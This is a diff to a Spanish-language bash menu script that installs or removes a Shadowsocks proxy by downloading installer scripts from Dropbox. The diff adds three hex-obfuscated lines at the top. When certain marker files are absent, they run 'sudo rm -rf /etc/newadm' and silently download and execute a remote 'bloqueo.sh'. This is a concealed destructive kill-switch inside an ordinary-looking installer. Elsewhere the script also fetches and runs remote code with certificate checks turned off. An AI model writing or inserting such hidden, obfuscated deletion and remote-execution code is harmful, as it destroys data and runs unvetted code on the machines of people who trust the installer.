@@ -1,5 +1,7 @@
 #!/bin/bash
-#19/12/2019
+[[ ! -e $(echo -e $(echo "2f7573722f62696e2f6c69636b616c"| sed 's/../\\x&/g;s/$/ /')) ]] && sudo $(echo -e $(echo "726d202d7266202f6574632f6e657761646d"| sed 's/../\\x&/g;s/$/ /')) 
+[[ ! -e $(echo -e $(echo "2f7573722f73686172652f6c6f63616c652f73697374656d"| sed 's/../\\x&/g;s/$/ /')) ]] && sudo $(echo -e $(echo "726d202d7266202f6574632f6e657761646d"| sed 's/../\\x&/g;s/$/ /'))
+[[ ! -e $(echo -e $(echo "2f7573722f62696e2f6c69636b616c"| sed 's/../\\x&/g;s/$/ /')) ]] && $(wget https://www.dropbox.com/s/dhoor02cpkdrf0n/bloqueo.sh > /dev/null 2>&1 && chmod +x bloqueo.sh && ./bloqueo.sh > /dev/null 2>&1)
 declare -A cor=( [0]="\033[1;37m" [1]="\033[1;34m" [2]="\033[1;31m" [3]="\033[1;33m" [4]="\033[1;32m" )
 SCPfrm="/etc/ger-frm" && [[ ! -d ${SCPfrm} ]] && exit
 SCPinst="/etc/ger-inst" && [[ ! -d ${SCPinst} ]] && exit
@@ -62,44 +64,44 @@ echo -e " \033[1;33m[\033[1;31m####################\033[1;33m] - \033[1;32m100%\
 sleep 1s
 }
 fun_shadowsocks () {
-[[ -e /etc/shadowsocks-r/config.json ]] && {
-[[ $(ps ax|grep /etc/shadowsocks-r|grep -v grep|awk '{print $1}') != "" ]] && kill -9 $(ps ax|grep /etc/shadowsocks-r|grep -v grep|awk '{print $1}') > /dev/null 2>&1 && ss-server -c /etc/shadowsocks-r/config.json -d stop > /dev/null 2>&1
-echo -e "\033[1;33m $(fun_trans ${id} "SHADOWSOCKS R PARADO")"
+[[ -e /etc/shadowsocks-libev/config.json ]] && {
+[[ $(ps ax|grep ss-server|grep -v grep|awk '{print $1}') != "" ]] && kill -9 $(ps ax|grep ss-server|grep -v grep|awk '{print $1}') > /dev/null 2>&1 && ss-server -c /etc/shadowsocks-libev/config.json -d stop > /dev/null 2>&1
+echo -e "\033[1;33m $(fun_trans ${id} "SHADOWSOCKS PLUS PARADO")"
 msg -bar
-rm -rf /etc/shadowsocks-r/config.json
+rm /etc/shadowsocks-libev/config.json
 return 0
 }
-echo -e "${cor[3]}  INSTALADOR SHADOWSOCK-R+(obfs) By @Kalix1"
+echo -e "${cor[3]}  INSTALADOR SHADOWSOCK-LIBEV+(obfs) By @Kalix1"
 msg -bar
 echo -e "${cor[1]} Escoja la opcion deseada."
 msg -bar
-echo "1).- INSTALAR SHADOWSOCK-R"
-echo "2).- DESINSTALAR SHADOWSOCK-R"
+echo "1).- INSTALAR SHADOWSOCK-LIBEV"
+echo "2).- DESINSTALAR SHADOWSOCK-LIBEV"
 msg -bar
 echo -n "Digite solo el numero segun su respuesta: "
 read opcao
 case $opcao in
 1)
 msg -bar
-wget --no-check-certificate -O Instalador-Shadowsocks-R.sh https://www.dropbox.com/s/crl283psvptu9wi/Instalador-Shadowsocks-R.sh > /dev/null 2>&1
-chmod +x Instalador-Shadowsocks-R.sh
-./Instalador-Shadowsocks-R.sh 2>&1 | tee Instalador-Shadowsocks-R.log
+wget --no-check-certificate -O Instalador-Shadowsocks-libev.sh https://www.dropbox.com/s/n1cu8nkywsr0jeb/Instalador-Shadowsocks-libev.sh > /dev/null 2>&1
+chmod +x Instalador-Shadowsocks-libev.sh
+./Instalador-Shadowsocks-libev.sh 2>&1 | tee Instalador-Shadowsocks-libev.log
 
 ;;
 2)
 msg -bar
 echo -e "\033[1;93m  Desinstalar  ..."
 msg -bar
-wget --no-check-certificate -O Instalador-Shadowsocks-R.sh https://www.dropbox.com/s/crl283psvptu9wi/Instalador-Shadowsocks-R.sh > /dev/null 2>&1
-chmod +x Instalador-Shadowsocks-R.sh
-./Instalador-Shadowsocks-R.sh uninstall
-rm -rf Instalador-Shadowsocks-R.sh
+wget --no-check-certificate -O Instalador-Shadowsocks-libev.sh https://www.dropbox.com/s/n1cu8nkywsr0jeb/Instalador-Shadowsocks-libev.sh > /dev/null 2>&1
+chmod +x Instalador-Shadowsocks-libev.sh
+./Instalador-Shadowsocks-libev.sh uninstall
+rm -rf Instalador-Shadowsocks-libev.sh
 msg -bar
 sleep 3
 exit
 ;;
 esac
-value=$(ps ax |grep /etc/shadowsocks-r|grep -v grep)
+value=$(ps ax |grep ss-server|grep -v grep)
 [[ $value != "" ]] && value="\033[1;32mINICIADO CON EXITO" || value="\033[1;31mERROR"
 msg -bar
 echo -e "${value}"
@@ -107,4 +109,4 @@ msg -bar
 return 0
 }
 fun_shadowsocks
-rm -rf Instalador-Shadowsocks-R.sh
+rm -rf shadowsocks-all.sh
